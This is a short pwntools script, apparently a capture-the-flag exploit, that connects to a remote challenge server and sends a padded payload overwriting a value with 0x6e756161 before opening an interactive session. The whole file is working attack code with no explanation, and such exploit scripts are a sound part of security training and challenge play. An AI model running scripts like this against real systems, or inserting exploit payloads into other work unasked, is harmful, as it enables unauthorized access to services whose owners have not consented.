from pwn import *
#p = process("./pwn")
p = remote("111.200.241.244",35304)
payload = 'a'*4 + p64(0x6e756161)
p.sendline(payload)
p.interactive()

